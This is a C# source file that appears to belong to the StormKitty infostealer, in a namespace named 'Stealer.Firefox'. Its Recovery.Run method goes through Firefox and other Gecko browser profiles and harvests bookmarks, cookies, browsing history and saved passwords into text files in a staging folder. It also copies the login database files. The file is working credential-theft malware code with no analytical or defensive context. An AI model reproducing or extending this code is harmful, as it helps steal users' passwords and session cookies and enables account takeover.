using System;
using System.IO;
using System.Collections.Generic;

namespace Stealer.Firefox
{
    internal sealed class Recovery
    {
        public static void Run(string sSavePath)
        {
            foreach (string path in Paths.sGeckoBrowserPaths)
            {
                try
                {
                    string name = new DirectoryInfo(path).Name;
                    string bSavePath = sSavePath + "\\" + name;
                    string browser = Paths.appdata + "\\" + path;

                    if (Directory.Exists(browser + "\\Profiles"))
                    {
                        Directory.CreateDirectory(bSavePath);

                        List<Bookmark> bookmarks = Firefox.cBookmarks.Get(browser); // Read all Firefox bookmarks
                        List<Cookie> cookies = Firefox.cCookies.Get(browser); // Read all Firefox cookies
                        List<Site> history = Firefox.cHistory.Get(browser); // Read all Firefox history
                        List<Password> passwords = Firefox.cPasswords.Get(browser); // Read all Firefox passwords

                        cBrowserUtils.WriteBookmarks(bookmarks, bSavePath + "\\Bookmarks.txt");
                        cBrowserUtils.WriteCookies(cookies, bSavePath + "\\Cookies.txt");
                        cBrowserUtils.WriteHistory(history, bSavePath + "\\History.txt");
                        cBrowserUtils.WritePasswords(passwords, bSavePath + "\\Passwords.txt");
                        // Copy all Firefox logins
                        Firefox.cLogins.GetDBFiles(browser + "\\Profiles\\", bSavePath);
                    }
                }
                catch (Exception ex) { StormKitty.Logging.Log("Firefox >> Failed to recover data\n" + ex); }
            }
        }
    }
}
